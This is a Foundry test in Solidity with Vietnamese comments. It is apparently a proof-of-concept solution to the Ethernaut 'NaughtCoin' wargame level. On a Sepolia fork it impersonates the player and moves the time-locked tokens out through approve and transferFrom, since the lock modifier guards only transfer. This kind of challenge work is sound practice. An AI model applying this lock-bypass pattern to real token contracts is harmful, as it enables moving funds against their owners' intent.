// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface INaughtCoin {
    function player() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

// KỊCH BẢN KIỂM TOÁN TỰ ĐỘNG (FOUNDRY TEST PoC)
contract NaughtCoinExploitTest is Test {
    INaughtCoin public targetContract;
    address public playerAddress;
    address public receiverAddress = address(0x9999); // Địa chỉ nhận tiền bypass

    function setUp() public {
        string memory rpcUrl = vm.envString("SEPOLIA_RPC_URL");
        vm.createSelectFork(rpcUrl);

        // Thay địa chỉ Instance bài NaughtCoin thực tế trên Sepolia của ông vào đây
        targetContract = INaughtCoin(
            0x1234567890123456789012345678901234567890
        );
        playerAddress = targetContract.player();
    }

    function test_NaughtCoinExploit() public {
        uint256 playerBalance = targetContract.balanceOf(playerAddress);
        assertTrue(playerBalance > 0, "Player should have tokens initially");

        // Giả lập ngữ cảnh người gọi giao dịch là Player
        vm.startPrank(playerAddress);

        // BƯỚC 1: Player ủy quyền cho chính địa chỉ của contract Test này được quyền chi tiêu toàn bộ token
        targetContract.approve(address(this), playerBalance);

        vm.stopPrank();

        // BƯỚC 2: Contract Test thực hiện lệnh transferFrom để rút tiền từ ví Player sang ví Receiver
        // Lệnh này thành công vì transferFrom không bị khóa bởi modifier lockTokens
        targetContract.transferFrom(
            playerAddress,
            receiverAddress,
            playerBalance
        );

        // Khẳng định số dư của Player đã bị đưa về bằng 0 thành công
        assertEq(
            targetContract.balanceOf(playerAddress),
            0,
            "Audit failed: Player still holds tokens"
        );
        assertEq(
            targetContract.balanceOf(receiverAddress),
            playerBalance,
            "Tokens not transferred correctly"
        );

        emit log(
            "Audit Verification: NaughtCoin lock timelock bypassed via standard approve/transferFrom flow."
        );
    }
}
